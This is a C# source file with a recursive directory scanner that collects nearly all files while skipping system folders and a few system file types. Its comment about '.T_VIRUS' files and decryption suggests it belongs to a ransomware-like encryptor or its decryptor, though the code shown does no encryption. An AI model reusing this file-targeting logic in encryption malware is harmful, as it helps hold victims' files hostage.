using System;
using System.Collections.Generic;
using System.IO;

namespace SPIDERS_UMBRELLA_CORPORATION.Core
{
    public class HiveScanner
    {
        public IEnumerable<string> Scan(string[] rootPaths)
        {
            foreach (var path in rootPaths)
            {
                if (Directory.Exists(path))
                {
                    foreach (var file in SafeWalk(path)) yield return file;
                }
            }
        }

        private IEnumerable<string> SafeWalk(string directory)
        {
            string[] files = null;
            try
            {
                files = Directory.GetFiles(directory, "*.*");
            }
            catch { }

            if (files != null)
            {
                foreach (var file in files)
                {
                    // Do NOT ignore .T_VIRUS here. 
                    // We need to see them for decryption.
                    // Only ignore system files and temp files.
                    if (!file.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase) &&
                        !file.EndsWith(".ini", StringComparison.OrdinalIgnoreCase) &&
                        !file.EndsWith(".db", StringComparison.OrdinalIgnoreCase) &&
                        !file.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                    {
                        yield return file;
                    }
                }
            }

            string[] subDirs = null;
            try
            {
                subDirs = Directory.GetDirectories(directory);
            }
            catch { }

            if (subDirs != null)
            {
                foreach (var dir in subDirs)
                {
                    string name = new DirectoryInfo(dir).Name;
                    // Skip system folders that trap scanners
                    if (name.StartsWith("$") || name == "System Volume Information") continue;

                    foreach (var f in SafeWalk(dir)) yield return f;
                }
            }
        }
    }
}